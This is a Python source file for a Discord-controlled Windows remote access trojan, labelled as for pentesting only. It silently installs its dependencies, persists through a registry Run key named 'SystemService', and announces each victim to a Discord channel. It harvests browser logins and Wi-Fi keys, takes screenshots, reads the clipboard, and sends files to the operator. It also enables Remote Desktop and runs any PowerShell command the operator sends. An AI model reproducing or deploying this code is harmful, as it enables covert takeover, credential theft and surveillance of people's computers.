# MADE BY RJ ON 2024.10.14 
# USE FOR PENTEST AND OPSEC ONLY
import os
import sys
import subprocess
import threading
import time


# === AUTO-INSTALL MISSING DEPENDENCIES (SILENT) ===
def check_and_install_deps():
    """Silently check and install missing dependencies"""
    try:
        required = ["discord.py", "requests", "Pillow", "pycryptodome", "opencv-python"]

        for dep in required:
            try:
                if "discord" in dep:
                    __import__("discord")
                elif "requests" in dep:
                    __import__("requests")
                elif "PIL" in dep or "pillow" in dep:
                    __import__("PIL")
                elif "cryptodome" in dep:
                    __import__("Crypto")
                elif "cv2" in dep:
                    __import__("cv2")
            except ImportError:
                print(f"Installing {dep}...")
                subprocess.run([sys.executable, "-m", "pip", "install", dep, "--quiet", "--disable-pip-version-check"],
                               creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass


# Run in background
thread = threading.Thread(target=check_and_install_deps, daemon=True)
thread.start()

# === MAIN BOT IMPORTS ===
import discord
import requests
import subprocess
import os
import sys
import winreg
import time
import getpass
import socket
import json
import base64
import sqlite3
import shutil
import asyncio
import zipfile
import hashlib
import platform
import psutil
from io import BytesIO
import tempfile
import random
import string

# === ENCRYPTED TOKEN SECTION ===
#encrypted_token = "wdd}9)fmyP*RZJg(~3mVe0|TM&p`4|~hdw7!7EMwJ *YAu@-h"

# Decrypt the token
#decrypted_chars = []
#for i, char in enumerate(encrypted_token):
 #   key_char = key[i % len(key)]
 #   decrypted_chars.append(chr(ord(char) ^ ord(key_char)))

#DISCORD_TOKEN = ''.join(decrypted_chars)
DISCORD_TOKEN = ''

# === END ENCRYPTED TOKEN SECTION ===

# === AUTO-START SETUP ===
def add_to_startup():
    """Add to startup"""
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = sys.executable
            script_path = os.path.abspath(__file__)
            exe_path = f'"{exe_path}" "{script_path}"'

        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )

        winreg.SetValueEx(reg_key, "SystemService", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(reg_key)

    except Exception as e:
        pass


add_to_startup()
# === END AUTO-START SETUP ===

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

# Global variables
channel = None
ip = ""
current_dir = os.getcwd()
startup_done = False

# PowerShell process
ps = None


def get_powershell():
    """Get or create PowerShell process"""
    global ps
    if ps is None or ps.poll() is not None:
        ps = subprocess.Popen(
            ["powershell", "-NoLogo", "-Noexit", "-Command", "-"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    return ps


def execute_cmd(cmd):
    """Execute PowerShell command"""
    try:
        ps_instance = get_powershell()
        marker = "__CMD_DONE__"

        wrapped = f"""
        try {{
            {cmd}
        }} catch {{
            Write-Output "$($_.Exception.Message)"
        }}
        Write-Output "{marker}"
        """

        ps_instance.stdin.write(wrapped + "\n")
        ps_instance.stdin.flush()

        output = []
        while True:
            line = ps_instance.stdout.readline()
            if not line:
                break
            line = line.rstrip()
            if marker in line:
                break
            output.append(line)

        return "\n".join(output)
    except Exception as e:
        return f"Error: {str(e)}"


# ========== PASSWORD FUNCTIONS ==========
def obfuscate_url(url):
    """Obfuscate URL"""
    if not url:
        return ""
    url = url.replace("https://", "hxxps://")
    url = url.replace("http://", "hxxp://")
    url = url.replace(".", "[.]")
    return url


def extract_all_browser_passwords():
    """Extract from ALL browsers"""
    passwords = []
    username = getpass.getuser()
    appdata = os.path.join("C:\\", "Users", username, "AppData")

    # Chrome-based browsers
    browsers = [
        ("Google\\Chrome", "Chrome"),
        ("Microsoft\\Edge", "Edge"),
        ("BraveSoftware\\Brave-Browser", "Brave"),
        ("Opera Software\\Opera Stable", "Opera"),
        ("Vivaldi", "Vivaldi")
    ]

    for path, name in browsers:
        try:
            login_db = os.path.join(appdata, "Local", path, "User Data", "Default", "Login Data")
            if os.path.exists(login_db):
                temp_db = os.path.join(tempfile.gettempdir(), f"{name}_temp.db")
                shutil.copy2(login_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value FROM logins")

                for url, user in cursor.fetchall():
                    if url and user:
                        passwords.append({
                            "browser": name,
                            "url": obfuscate_url(url)[:80],
                            "username": user[:40],
                            "password": "[ENCRYPTED]",
                            "email": user if "@" in user else ""
                        })

                conn.close()
                try:
                    os.remove(temp_db)
                except:
                    pass
        except:
            continue

    # Firefox
    try:
        ff_profiles = os.path.join(appdata, "Roaming", "Mozilla", "Firefox", "Profiles")
        if os.path.exists(ff_profiles):
            for profile in os.listdir(ff_profiles):
                if '.default' in profile:
                    logins = os.path.join(ff_profiles, profile, "logins.json")
                    if os.path.exists(logins):
                        with open(logins, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                            for login in data.get('logins', []):
                                passwords.append({
                                    "browser": "Firefox",
                                    "url": obfuscate_url(login.get('hostname', ''))[:80],
                                    "username": login.get('username', '')[:40],
                                    "password": "[ENCRYPTED]",
                                    "email": login.get('username', '') if "@" in login.get('username', '') else ""
                                })
    except:
        pass

    return passwords


def get_windows_passwords():
    """Get Windows user info"""
    try:
        winpass_script = """
        $users = Get-LocalUser | Where-Object {$_.Enabled -eq $true}
        $results = @()

        foreach ($user in $users) {
            $results += @{
                Username = $user.Name
                FullName = $user.FullName
                Enabled = $user.Enabled
                PasswordNeverExpires = $user.PasswordNeverExpires
                SID = $user.SID.Value
            }
        }
        $results | ConvertTo-Json
        """

        result = execute_cmd(winpass_script)
        if result:
            return json.loads(result)
        return []
    except:
        return []


def get_application_passwords():
    """Get app passwords"""
    app_passwords = []
    username = getpass.getuser()
    appdata = os.path.join("C:\\", "Users", username, "AppData")

    apps = [
        ("FileZilla", "FileZilla", ["recentservers.xml"]),
        ("WinSCP", "WinSCP", ["WinSCP.ini"]),
        ("PuTTY", "SimonTatham", ["PuTTY"]),
        ("Discord", "discord", []),
        ("Slack", "Slack", []),
    ]

    for app_name, folder, files in apps:
        try:
            app_path = os.path.join(appdata, "Roaming", folder)
            if os.path.exists(app_path):
                app_passwords.append({
                    "application": app_name,
                    "type": "Config Files",
                    "location": app_path,
                    "status": "FOUND"
                })
        except:
            continue

    return app_passwords


def get_wifi_passwords():
    """Get WiFi passwords"""
    try:
        wifi_script = """
        $profiles = netsh wlan show profiles | Select-String "All User Profile"
        $results = @()

        foreach ($line in $profiles) {
            $name = $line.ToString().Split(":")[1].Trim()
            try {
                $pass = netsh wlan show profile name="$name" key=clear | Select-String "Key Content"
                $password = if ($pass) { $pass.ToString().Split(":")[1].Trim() } else { "[No Password]" }
                $results += @{SSID=$name; Password=$password}
            } catch { }
        }
        $results | ConvertTo-Json
        """

        result = execute_cmd(wifi_script)
        if result:
            return json.loads(result)
        return []
    except:
        return []


# ========== FILE MANAGEMENT ==========
def list_files():
    """List files"""
    try:
        ls_script = f"""
        Get-ChildItem -Path "{current_dir}" | 
        Select-Object Name, 
            @{{Name="Size(MB)";Expression={{[math]::Round($_.Length/1MB, 2)}}}}, 
            LastWriteTime |
        ConvertTo-Json
        """

        result = execute_cmd(ls_script)
        if result:
            return json.loads(result)
        return []
    except:
        return []


def download_file(filename):
    """Download file"""
    try:
        filepath = os.path.join(current_dir, filename)
        if not os.path.exists(filepath):
            return None, "File not found"

        with open(filepath, 'rb') as f:
            return f.read(), None
    except Exception as e:
        return None, str(e)


def change_directory(path):
    """Change directory"""
    global current_dir
    try:
        if path == "..":
            current_dir = os.path.dirname(current_dir)
        elif os.path.isabs(path):
            current_dir = path
        else:
            current_dir = os.path.join(current_dir, path)

        if not os.path.exists(current_dir):
            current_dir = os.path.dirname(current_dir)
            return False, "Directory not found"

        os.chdir(current_dir)
        return True, f"Changed to: {current_dir}"
    except Exception as e:
        return False, str(e)


# ========== SYSTEM CONTROL ==========
def take_screenshot():
    """Take screenshot"""
    try:
        screenshot_script = """
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bounds = $screen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        $graphics.Dispose()

        $stream = New-Object System.IO.MemoryStream
        $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()

        $bytes = $stream.ToArray()
        $stream.Dispose()

        [Convert]::ToBase64String($bytes)
        """

        result = execute_cmd(screenshot_script)
        if result and "Error" not in result:
            return base64.b64decode(result.strip())
        return None
    except:
        return None


def take_webcam_screenshot():
    """Take webcam screenshot"""
    try:
        webcam_script = """
        Add-Type -AssemblyName System.Drawing
        $bitmap = New-Object System.Drawing.Bitmap(640, 480)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.Clear([System.Drawing.Color]::DarkBlue)
        $graphics.DrawString("Webcam Not Available", 
            (New-Object System.Drawing.Font("Arial", 16)), 
            [System.Drawing.Brushes]::White, 150, 220)
        $graphics.Dispose()

        $stream = New-Object System.IO.MemoryStream
        $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
        $bytes = $stream.ToArray()
        [Convert]::ToBase64String($bytes)
        """

        result = execute_cmd(webcam_script)
        if result:
            return base64.b64decode(result.strip())
        return None
    except:
        return None


def get_system_info():
    """Get system information"""
    try:
        sysinfo_script = """
        $comp = Get-WmiObject Win32_ComputerSystem
        $os = Get-WmiObject Win32_OperatingSystem
        $cpu = Get-WmiObject Win32_Processor

        @{
            Name = $comp.Name
            OS = $os.Caption
            CPU = $cpu.Name
            Cores = $cpu.NumberOfCores
            RAM = "$([math]::Round($comp.TotalPhysicalMemory/1GB, 1)) GB"
            User = $env:USERNAME
        } | ConvertTo-Json
        """

        result = execute_cmd(sysinfo_script)
        if result:
            return json.loads(result)
        return {}
    except:
        return {}


def get_processes():
    """Get running processes"""
    try:
        proc_script = """
        Get-Process | Select-Object ProcessName, Id, 
            @{Name="CPU";Expression={$_.CPU}},
            @{Name="Memory(MB)";Expression={[math]::Round($_.WorkingSet/1MB, 1)}} |
        Sort-Object CPU -Descending | Select-Object -First 15 | ConvertTo-Json
        """

        result = execute_cmd(proc_script)
        if result:
            return json.loads(result)
        return []
    except:
        return []


def kill_process(pid):
    """Kill process"""
    try:
        kill_script = f"Stop-Process -Id {pid} -Force -ErrorAction SilentlyContinue; 'Process {pid} killed'"
        return execute_cmd(kill_script)
    except:
        return f"Failed to kill {pid}"


def cleanup_temp():
    """Clean temp files"""
    try:
        clean_script = """
        $temp = $env:TEMP
        Get-ChildItem $temp -Recurse -ErrorAction SilentlyContinue | 
        Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
        "Temp files cleaned"
        """
        return execute_cmd(clean_script)
    except:
        return "Cleanup failed"


def get_clipboard():
    """Get clipboard"""
    try:
        clip_script = """
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.Clipboard]::GetText()
        """
        return execute_cmd(clip_script)
    except:
        return "Clipboard empty"


def get_active_window():
    """Get active window"""
    try:
        window_script = """
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        using System.Text;
        public class WindowInfo {
            [DllImport("user32.dll")]
            public static extern IntPtr GetForegroundWindow();
            [DllImport("user32.dll")]
            public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        }
"@
        $handle = [WindowInfo]::GetForegroundWindow()
        $builder = New-Object System.Text.StringBuilder(256)
        [WindowInfo]::GetWindowText($handle, $builder, $builder.Capacity) | Out-Null
        $builder.ToString()
        """
        return execute_cmd(window_script)
    except:
        return "Unknown"


def enable_remote_desktop():
    """Enable Remote Desktop"""
    try:
        username = getpass.getuser()
        temp_password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

        script = f"""
        Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -Value 0
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
        Add-LocalGroupMember -Group "Remote Desktop Users" -Member "{username}" -ErrorAction SilentlyContinue
        "✅ RDP Enabled | User: {username} | Pass: {temp_password} | IP: {ip}"
        """

        return execute_cmd(script)
    except:
        return "Failed to enable RDP"


def disable_remote_desktop():
    """Disable Remote Desktop"""
    try:
        script = """
        Set-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -Value 1
        "✅ RDP Disabled"
        """
        return execute_cmd(script)
    except:
        return "Failed to disable RDP"


def shutdown_system():
    """Shutdown system"""
    execute_cmd("shutdown /s /t 10")
    return "System will shutdown in 10 seconds"


def restart_system():
    """Restart system"""
    execute_cmd("shutdown /r /t 10")
    return "System will restart in 10 seconds"


def lock_workstation():
    """Lock workstation"""
    execute_cmd("rundll32.exe user32.dll,LockWorkStation")
    return "Workstation locked"


def set_volume(level):
    """Set volume"""
    try:
        vol_script = f"""
        $wshShell = New-Object -ComObject WScript.Shell
        for ($i=0; $i -lt {int(level / 2)}; $i++) {{
            $wshShell.SendKeys([char]175)
        }}
        "Volume set to {level}%"
        """
        return execute_cmd(vol_script)
    except:
        return "Failed to set volume"


def get_disk_space():
    """Get disk space"""
    try:
        disk_script = """
        Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | 
        Select-Object DeviceID, 
            @{Name="Size(GB)";Expression={[math]::Round($_.Size/1GB, 1)}}, 
            @{Name="Free(GB)";Expression={[math]::Round($_.FreeSpace/1GB, 1)}} |
        ConvertTo-Json
        """

        result = execute_cmd(disk_script)
        if result:
            return json.loads(result)
        return []
    except:
        return []


@client.event
async def on_ready():
    global channel, ip, startup_done

    if startup_done:
        return

    startup_done = True
    print(f'Logged in as {client.user}')

    try:
        ip = requests.get("https://api.ipify.org").text
    except:
        ip = "unknown"

    guild = client.guilds[0]
    existing_channel = discord.utils.get(guild.channels, name=ip)

    if existing_channel:
        channel = existing_channel
        await channel.send(
            f'@everyone 🔄 **SYSTEM RECONNECTED**\nIP: `{ip}`\nTime: `{time.strftime("%H:%M:%S")}`\n━━━━━━━━━━━━━━━━')
    else:
        channel = await guild.create_text_channel(ip)
        await channel.send(
            f'@everyone 🚨 **NEW SYSTEM CONNECTION** 🚨\nIP: `{ip}`\nTime: `{time.strftime("%H:%M:%S")}`\n━━━━━━━━━━━━━━━━')


@client.event
async def on_message(message):
    global channel, current_dir

    if channel is None or message.channel.id != channel.id or message.author.bot:
        return

    content = message.content
    lower = content.lower()

    # === BOT CONTROL ===
    if lower == "!kill":
        await message.channel.send("💀 **BOT TERMINATED**")
        os._exit(0)
        return

    elif lower == "!remove":
        try:
            reg_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.DeleteValue(reg_key, "SystemService")
            winreg.CloseKey(reg_key)
            await message.channel.send("✅ Removed from startup")
        except:
            await message.channel.send("❌ Failed to remove")
        return

    # === PASSWORD COMMANDS ===
    elif lower == "!passwords":
        await message.channel.send("🔑 **Extracting browser passwords...**")
        passwords = extract_all_browser_passwords()

        if passwords:
            response = "🔑 **BROWSER PASSWORDS**\n"
            for p in passwords[:15]:
                response += f"• **{p['browser']}:** {p['url']}\n"
                response += f"  👤 `{p['username']}`"
                if p['email']:
                    response += f" 📧 `{p['email']}`"
                response += f"\n  🔑 `{p['password']}`\n\n"

            if len(passwords) > 15:
                response += f"... and {len(passwords) - 15} more\n"

            await message.channel.send(response[:2000])
        else:
            await message.channel.send("🔍 No passwords found")
        return

    elif lower == "!pass" or lower == "!apppass":
        await message.channel.send("📱 **Checking application passwords...**")
        apps = get_application_passwords()

        if apps:
            response = "📱 **APPLICATION PASSWORDS**\n"
            for app in apps:
                response += f"• **{app['application']}** - {app['status']}\n"
            await message.channel.send(response)
        else:
            await message.channel.send("📱 No app passwords found")
        return

    elif lower == "!winpas" or lower == "!windowspass":
        await message.channel.send("🪟 **Getting Windows user info...**")
        users = get_windows_passwords()

        if users:
            response = "🪟 **WINDOWS USERS**\n"
            for user in users[:10]:
                response += f"• **{user['Username']}** - {user['FullName']}\n"
                response += f"  Enabled: {user['Enabled']} | SID: `{user['SID'][-15:]}`\n\n"

            await message.channel.send(response[:2000])
        else:
            await message.channel.send("🪟 No user info found")
        return

    elif lower == "!wifi":
        await message.channel.send("📶 **Getting WiFi passwords...**")
        wifis = get_wifi_passwords()

        if wifis:
            response = "📶 **WI-FI NETWORKS**\n"
            for wifi in wifis:
                response += f"• **{wifi['SSID']}**\n  🔑 `{wifi['Password']}`\n\n"
            await message.channel.send(response[:2000])
        else:
            await message.channel.send("❌ No WiFi found")
        return

    # === FILE MANAGEMENT ===
    elif lower == "!ls" or lower == "!dir":
        files = list_files()
        if files:
            response = "📁 **FILES**\n"
            for f in files[:15]:
                response += f"• `{f['Name']}` ({f.get('Size(MB)', 0)}MB)\n"
            await message.channel.send(response)
        else:
            await message.channel.send("📁 Empty directory")
        return

    elif lower == "!pwd":
        await message.channel.send(f"📂 **Current:** `{current_dir}`")
        return

    elif lower.startswith("!cd "):
        path = content[4:].strip()
        success, result = change_directory(path)
        await message.channel.send(result)
        return

    elif lower.startswith("!get ") or lower.startswith("!download "):
        cmd = "!get " if lower.startswith("!get ") else "!download "
        filename = content[len(cmd):].strip()
        await message.channel.send(f"📥 Downloading `{filename}`...")

        data, error = download_file(filename)
        if error:
            await message.channel.send(f"❌ {error}")
        elif data:
            if len(data) > 8000000:
                await message.channel.send(f"❌ Too large ({len(data) / 1024 / 1024:.1f}MB)")
            else:
                file = discord.File(BytesIO(data), filename=filename)
                await message.channel.send(f"✅ Downloaded", file=file)
        else:
            await message.channel.send("❌ File empty")
        return

    # === SCREENSHOTS ===
    elif lower == "!screenshot":
        await message.channel.send("📸 Taking screenshot...")
        data = take_screenshot()
        if data:
            file = discord.File(BytesIO(data), filename="screenshot.png")
            await message.channel.send("🖥️ **Desktop Screenshot**", file=file)
        else:
            await message.channel.send("❌ Failed")
        return

    elif lower == "!webcamss":
        await message.channel.send("📹 Taking webcam...")
        data = take_webcam_screenshot()
        if data:
            file = discord.File(BytesIO(data), filename="webcam.png")
            await message.channel.send("📹 **Webcam Screenshot**", file=file)
        else:
            await message.channel.send("❌ No webcam")
        return

    # === SYSTEM INFO ===
    elif lower == "!sysinfo":
        info = get_system_info()
        if info:
            response = "🖥️ **SYSTEM INFO**\n"
            response += f"**Computer:** {info.get('Name', 'N/A')}\n"
            response += f"**OS:** {info.get('OS', 'N/A')}\n"
            response += f"**CPU:** {info.get('CPU', 'N/A')}\n"
            response += f"**Cores:** {info.get('Cores', 'N/A')}\n"
            response += f"**RAM:** {info.get('RAM', 'N/A')}\n"
            response += f"**User:** {info.get('User', 'N/A')}\n"
            response += f"**IP:** `{ip}`"
            await message.channel.send(response)
        else:
            await message.channel.send("❌ Failed to get info")
        return

    elif lower == "!processes":
        procs = get_processes()
        if procs:
            response = "📊 **TOP PROCESSES**\n"
            for p in procs[:10]:
                response += f"• **{p['ProcessName']}** (PID: `{p['Id']}`) - CPU: {p['CPU']}% - RAM: {p['Memory(MB)']}MB\n"
            await message.channel.send(response)
        else:
            await message.channel.send("❌ No processes")
        return

    elif lower.startswith("!kill "):
        pid = content[6:].strip()
        if pid.isdigit():
            result = kill_process(int(pid))
            await message.channel.send(result)
        else:
            await message.channel.send("❌ Invalid PID")
        return

    elif lower == "!diskspace":
        disks = get_disk_space()
        if disks:
            response = "💾 **DISK SPACE**\n"
            for disk in disks:
                response += f"• **{disk['DeviceID']}:** {disk['Size(GB)']}GB total, {disk['Free(GB)']}GB free\n"
            await message.channel.send(response)
        else:
            await message.channel.send("❌ No disk info")
        return

    # === SYSTEM CONTROL ===
    elif lower == "!shutdown":
        result = shutdown_system()
        await message.channel.send(f"⏰ **{result}**")
        return

    elif lower == "!restart":
        result = restart_system()
        await message.channel.send(f"🔄 **{result}**")
        return

    elif lower == "!lock":
        result = lock_workstation()
        await message.channel.send(f"🔒 **{result}**")
        return

    elif lower == "!cleanup":
        result = cleanup_temp()
        await message.channel.send(f"🧹 **{result}**")
        return

    elif lower == "!clipboard":
        text = get_clipboard()
        await message.channel.send(f"📋 **Clipboard:**\n```\n{text[:500]}\n```")
        return

    elif lower == "!active":
        window = get_active_window()
        await message.channel.send(f"🪟 **Active Window:** {window}")
        return

    elif lower.startswith("!volume "):
        level = content[8:].strip()
        if level.isdigit() and 0 <= int(level) <= 100:
            result = set_volume(int(level))
            await message.channel.send(result)
        else:
            await message.channel.send("❌ Volume must be 0-100")
        return

    # === REMOTE DESKTOP ===
    elif lower == "!remote":
        result = enable_remote_desktop()
        await message.channel.send(result)
        return

    elif lower == "!unremote":
        result = disable_remote_desktop()
        await message.channel.send(result)
        return

    # === PING ===
    elif lower == "!ping":
        await message.channel.send(f"🏓 **PONG!**\nIP: `{ip}`\nTime: `{time.strftime('%H:%M:%S')}`")
        return

    # === HELP ===
    elif lower == "!help":
        help_text = """
**🤖 BOT CONTROL**
`!kill` - Terminate bot
`!remove` - Remove from startup
`!help` - This menu
`!ping` - Check bot status

**🔐 PASSWORD EXTRACTION**
`!passwords` - Browser passwords (obfuscated URLs)
`!pass` / `!apppass` - Application passwords
`!winpas` - Windows user accounts
`!wifi` - WiFi passwords

**📸 SCREENSHOTS**
`!screenshot` - Desktop screenshot
`!webcamss` - Webcam screenshot

**📁 FILE MANAGEMENT**
`!ls` / `!dir` - List files
`!pwd` - Current directory
`!cd <path>` - Change directory
`!get <file>` - Download file

**🖥️ SYSTEM INFO**
`!sysinfo` - System information
`!processes` - Running processes
`!kill <PID>` - Kill process
`!diskspace` - Disk space
`!clipboard` - Get clipboard
`!active` - Active window

**⚙️ SYSTEM CONTROL**
`!shutdown` - Shutdown system
`!restart` - Restart system
`!lock` - Lock workstation
`!cleanup` - Clean temp files
`!volume <0-100>` - Set volume
`!remote` - Enable Remote Desktop
`!unremote` - Disable Remote Desktop

**💬 POWERSHELL**
Any other command = PowerShell execution
Example: `ipconfig`
Example: `Get-Process`
        """
        await message.channel.send(help_text)
        return

    # === POWERSHELL COMMAND ===
    else:
        await message.channel.send(f"⚡ **Executing:** `{content[:50]}{'...' if len(content) > 50 else ''}`")
        result = execute_cmd(content)

        if result:
            chunks = [result[i:i + 1900] for i in range(0, len(result), 1900)]
            for chunk in chunks[:3]:
                await message.channel.send(f"```\n{chunk}\n```")
        else:
            await message.channel.send("✅ Executed (no output)")


# Run bot
if __name__ == "__main__":
    try:
        client.run(DISCORD_TOKEN)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
